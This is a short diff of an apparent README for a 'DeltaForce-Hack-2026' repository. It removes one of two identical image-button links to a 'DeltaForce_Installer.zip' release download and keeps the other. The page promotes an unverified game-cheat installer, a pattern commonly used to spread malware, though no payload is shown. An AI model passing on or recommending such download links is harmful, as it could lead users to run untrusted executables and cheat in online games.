@@ -76,9 +76,6 @@ Follow the instructions shown by the installer and wait for the installation to 
 
 * **Dependency Manager:** vcpkg (automatically integrated)
 
-<a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
-  <img width="1774" height="887" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
-</a>
 
 
   <a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
